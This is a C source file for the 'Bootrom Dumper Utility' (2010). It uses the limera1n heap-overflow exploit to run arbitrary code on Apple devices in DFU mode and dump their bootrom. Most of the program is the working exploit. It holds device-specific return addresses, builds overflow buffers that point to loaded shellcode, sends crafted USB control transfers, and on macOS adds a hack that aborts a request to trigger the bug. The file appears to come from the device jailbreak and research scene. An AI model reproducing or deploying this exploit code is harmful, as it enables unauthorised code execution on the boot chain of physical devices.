// Bootrom Dumper Utility
// (c) pod2g october 2010
//
// thanks to :
// - Chronic Dev Team for their support
// - geohot for limera1n

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <libusb-1.0/libusb.h>
#ifdef __APPLE__
#include "darwin_usb.h"
#endif

#define LOADADDR	0x84000000
// A4:
#if defined(DEVICE_A4)
#define EXPLOIT_LR	0x8403BF9C
#define LOADADDR_SIZE	0x2C000
// iPod 3G:
#elif defined(DEVICE_3G)
#define EXPLOIT_LR	0x84033F98
#define LOADADDR_SIZE	0x24000
// iPhone 3Gs:
#elif defined(DEVICE_3GS_NEW_BOOTROM)
#define EXPLOIT_LR	0x84033FA4
#define LOADADDR_SIZE	0x24000
#else
#error No device type specified!
#endif

#define VENDOR_ID    0x05AC
#define WTF_MODE     0x1227
#define BUF_SIZE     0x10000

#ifdef __APPLE__
	void dummy_callback() { }
#endif

struct libusb_device_handle *usb_init(struct libusb_context* context, int devid) {
	struct libusb_device **device_list;
	struct libusb_device_handle *handle = NULL;

	int deviceCount = libusb_get_device_list(context, &device_list);

	int i;
	for (i = 0; i < deviceCount; i++) {
		struct libusb_device* device = device_list[i];
		struct libusb_device_descriptor desc;
		libusb_get_device_descriptor(device, &desc);	
		if (desc.idVendor == VENDOR_ID && desc.idProduct == devid) {
			libusb_open(device, &handle);
			break;
		}
	}
	
	libusb_free_device_list(device_list, 1);

	return handle;
}

void usb_close(struct libusb_device_handle *handle) {
	if (handle != NULL) {
		libusb_close(handle);
	}
}

void usb_deinit() {
	libusb_exit(NULL);
}

void get_status(struct libusb_device_handle *handle) {
	unsigned char status[6];
	int ret, i;
	ret = libusb_control_transfer(handle, 0xA1, 3, 0, 0, status, 6, 100);
}

void dfu_notify_upload_finshed(struct libusb_device_handle *handle) {
	int ret, i;
	ret = libusb_control_transfer(handle, 0x21, 1, 0, 0, 0, 0, 100);
	for (i=0; i<3; i++){
		get_status(handle);
	}
	libusb_reset_device(handle);
}

struct libusb_device_handle* usb_wait_device_connection(struct libusb_context* context, struct libusb_device_handle *handle) {
        sleep(2);
        usb_close(handle);
        handle = usb_init(context, WTF_MODE);
}

int readfile(char *filename, void* buffer, unsigned int skip) {
        FILE* file = fopen(filename, "rb");
        if (file == NULL) {
                printf("File %s not found.\n", filename);
                return 1;
        }
        fseek(file, 0, SEEK_END);
        int len = ftell(file);
        fseek(file, skip, SEEK_SET);
        fread(buffer, 1, len - skip, file);
        fclose(file);

	return len-skip;
}

int main(int argc, char *argv[]) {
	struct libusb_context* context;
	struct libusb_device_handle *handle = NULL;
	int i, ret;
	unsigned char data[0x800];
	unsigned char status[6];

	printf("______ Bootrom Dumper Utility (BDU) 1.0 ______\n");
	printf("\n");
	printf("                        (c) pod2g october 2010\n");
	printf("\n");
	
	// 1. Initialisation of the USB connection with the device in DFU
	libusb_init(&context);
	//libusb_set_debug(NULL, 3);
	handle = usb_init(context, WTF_MODE);
	if (handle == NULL) {
		printf("[X] Please connect your iDevice in _DFU_ mode.\n");
		return 1;
	}

	// 2. Executing dump payload using geohot's limera1n
	printf("[.] Now executing arbitrary code using geohot's limera1n...\n");
	unsigned char buf[LOADADDR_SIZE];
	memset(buf, 0, LOADADDR_SIZE);
	unsigned int shellcode[0x800];
	unsigned int shellcode_address = LOADADDR + LOADADDR_SIZE - 0x1000 + 1;
	unsigned int stack_address = EXPLOIT_LR;
	unsigned int shellcode_length = readfile("payload.bin", shellcode, 0);
	memset(buf, 0xCC, 0x800);
	for(i=0;i<0x800;i+=0x40) {
 		unsigned int* heap = (unsigned int*)(buf+i);
		heap[0] = 0x405;
		heap[1] = 0x101;
		heap[2] = shellcode_address;
		heap[3] = stack_address;
	}
	printf("sent data to copy: %X\n", libusb_control_transfer(handle, 0x21, 1, 0, 0, buf, 0x800, 1000));
	memset(buf, 0xCC, 0x800);
	for(i = 0; i < (LOADADDR_SIZE - 0x1800); i += 0x800) {
		libusb_control_transfer(handle, 0x21, 1, 0, 0, buf, 0x800, 1000);
	}
	printf("padded to 0x%X\n", LOADADDR + LOADADDR_SIZE - 0x1000);
	printf("sent shellcode: %X has real length %X\n", libusb_control_transfer(handle, 0x21, 1, 0, 0, (unsigned char*) shellcode, 0x800, 1000), shellcode_length);
	memset(buf, 0xBB, 0x800);
	printf("never freed: %X\n", libusb_control_transfer(handle, 0xA1, 1, 0, 0, buf, 0x800, 1000));
	
	#ifndef __APPLE__
	printf("sent fake data to timeout: %X\n", libusb_control_transfer(handle, 0x21, 1, 0, 0, buf, 0x800, 10));
	#else
	// pod2g: dirty hack for limera1n support.
	IOReturn kresult;
	IOUSBDevRequest req;
	bzero(&req, sizeof(req));
	//struct darwin_device_handle_priv *priv = (struct darwin_device_handle_priv *)client->handle->os_priv;
	struct darwin_device_priv *dpriv = (struct darwin_device_priv *)handle->dev->os_priv;
	req.bmRequestType     = 0x21;
	req.bRequest          = 1;
	req.wValue            = OSSwapLittleToHostInt16 (0);
	req.wIndex            = OSSwapLittleToHostInt16 (0);
	req.wLength           = OSSwapLittleToHostInt16 (0x800);
	req.pData             = buf + LIBUSB_CONTROL_SETUP_SIZE;
	kresult = (*(dpriv->device))->DeviceRequestAsync(dpriv->device, &req, (IOAsyncCallback1) dummy_callback, NULL);
	usleep(5 * 1000);
	kresult = (*(dpriv->device))->USBDeviceAbortPipeZero (dpriv->device);
	#endif
	
	printf("sent exploit to heap overflow: %X\n", libusb_control_transfer(handle, 0x21, 2, 0, 0, buf, 0, 1000));
	libusb_reset_device(handle);
	dfu_notify_upload_finshed(handle);
	libusb_reset_device(handle);
	printf("[.] Dump payload started.\n");

	// 3. bootrom dump by communicating with the payload
	printf("[.] Now dumping bootrom to file bootrom.bin...\n");
	handle = usb_wait_device_connection(context, handle);
        if (!handle) {
                printf("[X] device stalled.\n");
		usb_close(handle);
		usb_deinit();
                return 1;
        }
	FILE * fOut = fopen("bootrom.bin", "wb");
	unsigned int addr = 0x0;
	do {
		ret = libusb_control_transfer(handle, 0xA1, 2, 0, 0, data, 0x800, 100);
		if (ret < 0) break;
		fwrite(data, 1, 0x800, fOut);
		addr += 0x800;
	} while (addr < 0x10000);
        fclose(fOut);
	printf("[.] Done. Goodbye!\n");

	usb_close(handle);
	usb_deinit();
	
	return 0;
}
